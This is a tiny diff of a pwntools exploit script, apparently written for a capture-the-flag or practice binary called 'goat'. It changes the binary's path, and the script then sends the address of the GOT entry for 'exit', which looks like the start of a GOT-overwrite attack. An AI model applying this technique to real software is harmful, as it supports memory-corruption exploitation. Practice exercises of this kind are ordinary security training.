@@ -1,6 +1,6 @@
 from pwn import *
 
-context.binary = "./goat"
+context.binary = "../goat"
 p = process()
 
 p.sendline(hex(context.binary.got["exit"]).encode("ascii"))
